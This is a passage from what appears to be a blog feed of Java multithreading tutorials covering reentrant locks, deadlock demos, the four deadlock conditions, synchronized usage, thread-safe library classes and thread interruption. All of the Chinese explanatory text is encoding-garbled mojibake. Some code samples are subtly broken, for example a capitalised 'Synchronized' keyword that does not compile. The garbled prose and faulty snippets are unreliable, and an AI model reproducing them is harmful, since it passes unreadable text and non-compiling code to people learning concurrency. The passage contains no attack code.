class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo15</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">            func2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123;</span><br><span class="line">        func3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">        func4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func4</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>tips</strong></p><p>æ— è®ºæœ‰å¤šå°‘å±‚éƒ½æ˜¯è¦åœ¨æœ€å¤–å±‚æ‰èƒ½é‡Šæ”¾é”<br>å¯ä»¥å¼•ç”¨è®¡æ•°å™¨æ¥ç¡®å®šæœ‰å¤šå°‘å±‚æˆ–è€…è®°å½•æ˜¯å¦çœŸçš„é‡Šæ”¾é”æˆåŠŸ(è®¡æ•°å™¨å€¼ä¸º0å³å¯)</p><h5 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h5><p><strong>1.ä¸€ä¸ªçº¿ç¨‹é’ˆå¯¹ä¸€æŠŠé”è¿ç»­åŠ é”ä¸¤æ¬¡ï¼Œå¦‚æœä¸æ˜¯å¯é‡å…¥é”ï¼Œå°±æ˜¯æ­»é”.</strong><br>æ¯”å¦‚æŠŠé’¥åŒ™é”åœ¨å±‹é‡Œäº†è¿›é—¨åˆéœ€è¦é’¥åŒ™å°±ä¸ºæ­»é”.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lock</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                   count++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>2.ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸¤æŠŠé”(æ— è®ºæ˜¯ä¸æ˜¯å¯é‡å…¥é”éƒ½ä¼šæ­»é”)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lock2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">A</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(), B = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">synchronized</span> (A) &#123;</span><br><span class="line">               <span class="comment">//sleepä¸€ä¸‹,æ˜¯ç»™t2æ—¶é—´,è®©t2ä¹Ÿèƒ½æ‹¿åˆ°B</span></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//å°è¯•è·å–B,å¹¶æ²¡æœ‰é‡Šæ”¾A</span></span><br><span class="line">               <span class="keyword">synchronized</span> (B) &#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;t1æ‹¿åˆ°äº†ä¸¤æŠŠé”&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">synchronized</span> (B) &#123;</span><br><span class="line">               <span class="comment">//sleepä¸€ä¸‹,æ˜¯ç»™t1æ—¶é—´,è®©t1èƒ½æ‹¿åˆ°A</span></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//å°è¯•è·å–A,å¹¶æ²¡æœ‰é‡Šæ”¾B</span></span><br><span class="line">               <span class="keyword">synchronized</span> (A) &#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;t2 æ‹¿åˆ°äº†ä¸¤æŠŠé”&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡ºç°æ­»é”æ˜¯å› ä¸ºä¸¤ä¸ªçº¿ç¨‹éƒ½å¡åœ¨äº†è·å–å¯¹æ–¹å·²ç»å¾—åˆ°é”çš„ä½ç½®.<br><strong>nä¸ªçº¿ç¨‹å¾—åˆ°mæŠŠé”</strong><br>OSè¯¾ä¸Šè€å¸ˆè®²è¿‡çš„å“²å­¦å®¶å°±é¤é—®é¢˜</p><h6 id="æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶"><a href="#æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶" class="headerlink" title="æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶"></a>æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶</h6><p>1.äº’æ–¥ä½¿ç”¨<br>ä¸€ä¸ªçº¿ç¨‹æ‹¿åˆ°é”Aå¦ä¸€ä¸ªçº¿ç¨‹ä¹Ÿæƒ³æ‹¿åˆ°é”Aï¼Œå°±éœ€è¦é˜»å¡ç­‰å¾….</p><p>2.ä¸å¯æŠ¢å <br>ä¸€ä¸ªçº¿ç¨‹æ‹¿åˆ°é”ä¹‹åå…¶ä»–çº¿ç¨‹æƒ³æ‹¿åˆ°è¿™ä¸ªé”åªèƒ½ç­‰å¾…çº¿ç¨‹Aé‡Šæ”¾è¿™ä¸ªé”</p><p>3.è¯·æ±‚ä¿æŒ<br>ä¸€ä¸ªçº¿ç¨‹æ‹¿åˆ°é”Aä¹‹åï¼Œåœ¨è·å–Açš„åŸºç¡€ä¸Šè¿˜æƒ³è·å–é”B.(åƒç€ç¢—é‡Œçš„çœ‹ç€é”…é‡Œçš„)</p><p>4.å¾ªç¯ç­‰å¾…<br>ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹éƒ½æƒ³äº’ç›¸è·å–å¯¹æ–¹çš„é”ï¼Œéƒ½è¿›å…¥ç­‰å¾…é˜Ÿåˆ—.(æœ€å®¹æ˜“è¢«ç ´åçš„ ä½†ä¿®æ”¹åŠ é”é¡ºåºå¯é¿å… )</p><p><strong>è§£å†³æ­»é”çš„æ–¹æ¡ˆä¹Ÿå°±æ˜¯ç ´åä¸Šè¿°å››ä¸ªæ¡ä»¶ä»»ä½•ä¸€ä¸ªå³å¯</strong><br>1)å¼•å…¥ä¸€ä¸ªé¢å¤–çš„é”<br>2)å»æ‰ä¸€ä¸ªçº¿ç¨‹<br>3)å¼•å…¥è®¡æ•°å™¨<br>4)å¼•å…¥åŠ é”è§„åˆ™ã€æ¯”è¾ƒæ¨è æ™®ä¸–æ€§é«˜-&gt;sychronizedã€‘</p><h5 id="synchronizedçš„ä½¿ç”¨æ–¹æ³•"><a href="#synchronizedçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="synchronizedçš„ä½¿ç”¨æ–¹æ³•"></a>synchronizedçš„ä½¿ç”¨æ–¹æ³•</h5><h6 id="1-ä¿®é¥°ä»£ç å—"><a href="#1-ä¿®é¥°ä»£ç å—" class="headerlink" title="1)ä¿®é¥°ä»£ç å—"></a>1)ä¿®é¥°ä»£ç å—</h6><p>é”ä»»æ„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        Synchronized (locker) &#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é”ä»»æ„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        Synchronized (<span class="built_in">this</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h6 id="2-ä¿®é¥°å®ä¾‹æ–¹æ³•"><a href="#2-ä¿®é¥°å®ä¾‹æ–¹æ³•" class="headerlink" title="2)ä¿®é¥°å®ä¾‹æ–¹æ³•"></a>2)ä¿®é¥°å®ä¾‹æ–¹æ³•</h6><p><strong>æ³¨æ„ é”å¯¹è±¡æ˜¯ä»€ä¹ˆä¸é‡è¦ é‡è¦çš„æ˜¯ä¸¤ä¸ªçº¿ç¨‹ä¸­çš„å¯¹è±¡æ˜¯å¦æ˜¯ä¸€ä¸ªå¯¹è±¡</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> count;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//æ­¤æ—¶ä½¿ç”¨thisä½œä¸ºé”å¯¹è±¡</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-ä¿®é¥°é™æ€æ–¹æ³•"><a href="#3-ä¿®é¥°é™æ€æ–¹æ³•" class="headerlink" title="3)ä¿®é¥°é™æ€æ–¹æ³•"></a>3)ä¿®é¥°é™æ€æ–¹æ³•</h6><p>é’ˆå¯¹ç±»å¯¹è±¡åŠ é”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase1</span><span class="params">()</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(Counter.class) &#123;</span><br><span class="line">        <span class="comment">//Couter.class -&gt;ç±»å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ ç±»å¯¹è±¡åœ¨ä¸€ä¸ªjavaè¿›ç¨‹ä¸­æ˜¯å”¯ä¸€çš„(ä»£ç ä¸­å†™äº†ä¸€ä¸ªCounterçš„ç±»å¯¹è±¡ï¼Œä¸ä¼šæœ‰å¤šä¸ª)</strong></p><h5 id="Javaæ ‡å‡†åº“ä¸­çš„æ–°åŸå®‰å…¨æœºåˆ¶"><a href="#Javaæ ‡å‡†åº“ä¸­çš„æ–°åŸå®‰å…¨æœºåˆ¶" class="headerlink" title="Javaæ ‡å‡†åº“ä¸­çš„æ–°åŸå®‰å…¨æœºåˆ¶"></a>Javaæ ‡å‡†åº“ä¸­çš„æ–°åŸå®‰å…¨æœºåˆ¶</h5><p>Java æ ‡å‡†åº“ä¸­å¾ˆå¤šéƒ½æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„. è¿™äº›ç±»å¯èƒ½ä¼šæ¶‰åŠåˆ°å¤šçº¿ç¨‹ä¿®æ”¹å…±äº«æ•°æ®, åˆæ²¡æœ‰ä»»ä½•åŠ é”æªæ–½.<br>å¦‚ï¼š</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ArrayList</span>,LinkedList,<span class="built_in">HashMap</span>,TreeMap,HashSet,TreeSet,StringBuilder</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€äº›æ˜¯çº¿ç¨‹å®‰å…¨çš„.ä½¿ç”¨äº†ä¸€äº›é”æœºåˆ¶æ¥æ§åˆ¶.<br>å¦‚ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Vector</span>(ä¸æ¨èä½¿ç”¨),<span class="built_in">HashTable</span>(ä¸æ¨èä½¿ç”¨),ConcurrentHashMap,<span class="built_in">StringBuffer</span>(ä¸æ¨èä½¿ç”¨)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰çš„æ˜¯æ²¡æœ‰åŠ é”,ä½†å› ä¸ºä¸æ¶‰åŠä¿®æ”¹çš„ç‰¹æ®Šç±»,ä¹Ÿæ˜¯çº¿ç¨‹å®‰å…¨çš„.</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x2_</title>
      <link href="/2024/09/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%8C/"/>
      <url>/2024/09/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤šçº¿ç¨‹ç¯‡äºŒ"><a href="#å¤šçº¿ç¨‹ç¯‡äºŒ" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡äºŒ"></a>å¤šçº¿ç¨‹ç¯‡äºŒ</h2><p><strong>å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­</strong></p><h3 id="Threadä¸­é‡è¦å±æ€§"><a href="#Threadä¸­é‡è¦å±æ€§" class="headerlink" title="Threadä¸­é‡è¦å±æ€§"></a>Threadä¸­é‡è¦å±æ€§</h3><h4 id="å¯åŠ¨çº¿ç¨‹start"><a href="#å¯åŠ¨çº¿ç¨‹start" class="headerlink" title="å¯åŠ¨çº¿ç¨‹start"></a>å¯åŠ¨çº¿ç¨‹start</h4><p>ä¸Šç¯‡æåˆ° **start åˆ™æ˜¯çœŸæ­£è°ƒç”¨äº†ç³»ç»Ÿ API, åœ¨ç³»ç»Ÿå†…æ ¸ä¸­åˆ›å»ºå‡ºçº¿ç¨‹, è®©çº¿ç¨‹å†è°ƒç”¨ run.**ï¼ˆâ€œå¹¶å‘â€œçš„å®ç°ï¼‰<br>å†ç”¨ä»£ç ä¸¾ä¾‹ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªç±», ç»§æ‰¿è‡ª Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–¹æ³•å°±æ˜¯çº¿ç¨‹çš„å…¥å£æ–¹æ³•.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºçº¿ç¨‹.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  äº¤æ›¿æ‰“å°</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//å…¨éƒ¨æ‰“å°Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»ˆæ­¢ï¼ˆä¸­æ–­ï¼‰çº¿ç¨‹"><a href="#ç»ˆæ­¢ï¼ˆä¸­æ–­ï¼‰çº¿ç¨‹" class="headerlink" title="ç»ˆæ­¢ï¼ˆä¸­æ–­ï¼‰çº¿ç¨‹"></a>ç»ˆæ­¢ï¼ˆä¸­æ–­ï¼‰çº¿ç¨‹</h4><p>é¡¾åæ€ä¹‰ï¼ŒisInterruptedå­˜åœ¨çš„æ„ä¹‰å°±æ˜¯ä¸ºäº†å¸®åŠ©æˆ‘ä»¬åœæ­¢æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹.</p><h5 id="ä¸ºä»€ä¹ˆè¦ä¸­æ–­çº¿ç¨‹ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ä¸­æ–­çº¿ç¨‹ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ä¸­æ–­çº¿ç¨‹ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ä¸­æ–­çº¿ç¨‹ï¼Ÿ</h5><p>ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å•ä½ï¼Œåšä¸€ä»¶äº‹ä¸€å®šæ˜¯æœ‰ç›®çš„è€Œä¸”å¤§å¤šç»“æœéƒ½æ˜¯å¯¹è‡ªå·±æœ‰åˆ©ï¼Œå¦‚æœå±€é¢é€æ¸ä¸å¯æ§åˆ¶ï¼Œç”šè‡³ä¼šé€ æˆæŸå®³é‚£å°±æœ‰å¿…è¦è®©å…¶åœä¸‹æ¥æˆ–è€…ç›´æ¥å–æ¶ˆå¯¹åº”çš„è®¡åˆ’.<br><strong>åœ¨javaä¸­æˆ‘ä»¬å¼•å…¥ä¸­æ–­çš„ç›®çš„å°±æ˜¯æœªäº†æ‰“æ–­çº¿ç¨‹æ‰€å¤„çš„æŸç§çŠ¶æ€ï¼ˆè¿™ç§çŠ¶æ€ä¸€å®šæ˜¯é˜»å¡çŠ¶æ€ï¼‰</strong></p><h5 id="ä¸­æ–­çš„å®ç°"><a href="#ä¸­æ–­çš„å®ç°" class="headerlink" title="ä¸­æ–­çš„å®ç°"></a>ä¸­æ–­çš„å®ç°</h5><p>è¦ç»ˆæ­¢&#x2F;é”€æ¯çº¿ç¨‹ï¼Œå°±æ˜¯è¦æƒ³åŠæ³•è®©runæ–¹æ³•å°½å¿«æ‰§è¡Œç»“æŸ.</p><h5 id="æ‰‹åŠ¨åˆ›å»ºæ ‡å¿—ä½"><a href="#æ‰‹åŠ¨åˆ›å»ºæ ‡å¿—ä½" class="headerlink" title="æ‰‹åŠ¨åˆ›å»ºæ ‡å¿—ä½"></a>æ‰‹åŠ¨åˆ›å»ºæ ‡å¿—ä½</h5><p>æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­æ‰‹åŠ¨åˆ›å»ºæ ‡å¿—ä½ï¼Œä½œä¸ºrunæ‰§è¡Œç»“æŸçš„æ¡ä»¶.<br>ä¸Šä»£ç å¥—é¤.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹çš„æ‰“æ–­</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">isQuit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!isQuit) &#123;</span><br><span class="line">                <span class="comment">// æ­¤å¤„çš„æ‰“å°å¯ä»¥æ›¿æ¢æˆä»»æ„çš„é€»è¾‘æ¥è¡¨ç¤ºçº¿ç¨‹çš„å®é™…å·¥ä½œå†…å®¹</span></span><br><span class="line">                System.out.println(<span class="string">&quot;çº¿ç¨‹å·¥ä½œä¸­&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) 